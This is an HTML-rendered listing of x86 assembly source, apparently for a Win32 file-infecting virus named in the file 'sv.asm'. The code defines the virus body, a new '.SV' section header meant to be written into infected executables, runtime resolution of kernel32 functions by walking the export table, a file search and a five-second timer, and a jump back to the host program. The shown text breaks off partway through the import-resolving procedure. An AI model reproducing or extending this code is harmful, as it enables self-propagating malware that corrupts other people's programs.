<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>sv.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">.386</span><span class="sc0">
</span><span class="sc5">.locals</span><span class="sc0">
</span><span class="sc5">.jumps</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">
</span><span class="sc5">L</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">LARGE</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">VirusSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusEnd</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusBegin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">PlusSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PlusEnd</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusEnd</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">wfdSize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">defs.inc</span><span class="sc0">

</span><span class="sc5">Pile</span><span class="sc0">            </span><span class="sc9">Segment</span><span class="sc0"> </span><span class="sc5">stack</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Pile</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">PCode</span><span class="sc0">           </span><span class="sc9">Segment</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">PCode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">PCode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Pile</span><span class="sc0">

</span><span class="sc5">VirusBegin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">PLoadLib</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'LoadLibraryA'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">PGetProcAdr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc0">

</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SFFFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SFNFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SFCFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'FindClose'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SCreateFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SFSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'GetFileSize'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SFSeek</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'SetFilePointer'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SReadFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ReadFile'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SWriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'WriteFile'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SCloseHndl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SMAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'GlobalAlloc'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SMFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'GlobalFree'</span><span class="sc0">
</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SExit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ExitProcess'</span><span class="sc0">

</span><span class="sc5">Library</span><span class="sc0">         </span><span class="sc5">User32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'user32.dll'</span><span class="sc0">

</span><span class="sc9">Import</span><span class="sc0">  </span><span class="sc5">SMsgBox</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">User32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MessageBoxA'</span><span class="sc0">
</span><span class="sc9">Import</span><span class="sc0">  </span><span class="sc5">SSetTimer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">User32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'SetTimer'</span><span class="sc0">
</span><span class="sc9">Import</span><span class="sc0">  </span><span class="sc5">SKillTimer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">User32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'KillTimer'</span><span class="sc0">

</span><span class="sc5">FutureEIP</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span><span class="sc1">;this will be the section i'll write in infected files</span><span class="sc0">
</span><span class="sc5">SectionHdr</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'.SV'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;Name of section</span><span class="sc0">
</span><span class="sc5">SRSize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;Size in RAM</span><span class="sc0">
</span><span class="sc5">SRVA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;Where it will be loaded in RAM</span><span class="sc0">
</span><span class="sc5">SFlSize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;size in file</span><span class="sc0">
</span><span class="sc5">SFlOff</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;where in file</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;some unneeded stuff</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0f0000060h</span><span class="sc0">      </span><span class="sc1">;some flags...</span><span class="sc0">

</span><span class="sc5">NxtPart</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;For Part merging {</span><span class="sc0">
</span><span class="sc5">SzPart</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; }</span><span class="sc0">

</span><span class="sc1">;only for testing</span><span class="sc0">
</span><span class="sc5">LogName</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'c:\sv.log'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LogHndl</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CRLF</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">InfectStr</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Infect...'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SubDirStr</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'=&gt;'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LogDirStr</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">VStart</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;At start, eax = eip, then eax = real offset of VStart</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VStart</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sEBX</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sECX</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sEDX</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sEDI</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sESI</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sEBP</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetKrnlBase</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">PLoadLib</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">PGetProcAdr</span><span class="sc0">

        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SFFFile</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SFNFile</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SFCFile</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SCreateFile</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SFSize</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SFSeek</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SReadFile</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SWriteFile</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SCloseHndl</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SMAlloc</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SMFree</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SExit</span><span class="sc0">

        </span><span class="sc5">LoadLibrary</span><span class="sc0">     </span><span class="sc5">User32</span><span class="sc0">
        </span><span class="sc5">DoImport</span><span class="sc0"> </span><span class="sc5">SMsgBox</span><span class="sc0">
        </span><span class="sc5">DoImport</span><span class="sc0"> </span><span class="sc5">SSetTimer</span><span class="sc0">
        </span><span class="sc5">DoImport</span><span class="sc0"> </span><span class="sc5">SKillTimer</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FutureEIP</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;for the 'ret' at the end</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc4">+</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LogName</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SCreateFile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LogHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wfd</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DriveIndx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SFFFile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FndHndl</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimerProc</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc0">                  </span><span class="sc1">;all 5 seconds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SSetTimer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimerHndl</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">RetHost</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sEDI</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sEBX</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sECX</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sEDX</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sESI</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sEBP</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;to FutureEIP</span><span class="sc0">

</span><span class="sc5">GetKrnlImport</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;parm: edx = kernel base</span><span class="sc0">
</span><span class="sc1">;      esi = fct struct ( dd ptr, db[] name, 0 )</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;That's the only reg we don't</span><span class="sc0">
                                                </span><span class="sc1">;use here...</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;Save it!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;ebx=MZ PTR</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;ebx=PE PTR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;ebx=Export tables RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;ebx=Export tables PTR</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;edi=Names table RVA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;edi=Names table PTR - 4</span><span class="sc0">
                                                </span><span class="sc1">; cuz + 4 after</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">    
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;esi=PTR to name to look</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                      
</span><span class="sc5">ESLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">ESStrLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ESLoop</span><span class="sc0">                          </span><span class="sc1">;Not equal, then next</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ESFound</span><span class="sc0">                         </span><span class="sc1">;0=end of string</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ESStrLoop</span><span class="sc0">
</span><span class="sc5">ESFound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Save1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;edi=PTR -&gt; fct name</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;edi=Fct# * 4 + Kernel</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">;edi=Fct# * 4</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;eax=RVA -&gt; export table</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;eax=PTR -&gt; export table</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;eax=RVA -&gt; named fcts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;eax=RVA -&gt; fct</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;eax=PTR -&gt; fct</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;Restore it!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
